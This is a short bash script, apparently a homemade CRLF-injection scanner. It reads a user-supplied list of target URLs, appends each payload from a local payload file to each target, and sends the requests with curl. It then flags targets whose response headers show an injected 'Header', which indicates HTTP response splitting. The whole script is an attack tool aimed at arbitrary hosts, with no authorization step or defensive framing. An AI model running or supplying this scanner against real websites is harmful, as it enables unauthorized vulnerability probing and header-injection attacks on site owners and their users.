#!/bin/bash
figlet -f digital.flf CRLF
ping -c 1 8.8.8.8 > /dev/null 2>&1
if [ $? -eq 0 ];
then
echo -e "\e[32mConnection Successfully done\e[0m"
sleep 2
myArray=("In" "God" "We" "Trust" "The" "Rest" "We" "Test")
for i in "${myArray[@]}";
do
echo -n $i " "
sleep 0.5
done
echo -e "\n"
read -p "Enter Your List : " list
read -p "Enter The Delay Between Requests: " delay
sleep 1
read -p "Verbose Mode Yes/No : " verbose
sleep 0.5
echo -e "\e[34mproccess in progress\e[0m"
sleep 2
if [ $verbose == "yes" ];
then
for target in $(cat $list);
do
echo -e "\t--------------------------------------------"
for input in $(cat /home/ali/Desktop/CRLFpayloads.txt)
do

curl -s -I -L $target/$input|grep -E "Header"|cut -d " " -f 1,2|sed '/[lL]ocation/d'
echo "The payload is ------->" $target/$input
sleep $delay
echo -e "\t\t --------------------------------------------"
done
done
elif [ $verbose == "no" ];
then
for target in $(cat $list);
do
for input in $(cat /home/ali/Desktop/CRLFpayloads.txt)
do
curl -s -I -L $target/$input|grep -E "Header"|cut -d " " -f 1,2|sed '/[lL]ocation/d'
sleep $delay
vuln=$(curl -s -I -L $target/$input|grep -E "Header"|cut -d " " -f 1,2|sed '/[lL]ocation/d')
if [ "$vuln" == "Header" ]
then
echo "$target/$input"
fi
done
done
fi
else
echo -e  "\e[31mcheck your connection\e[0m"
exit
fi
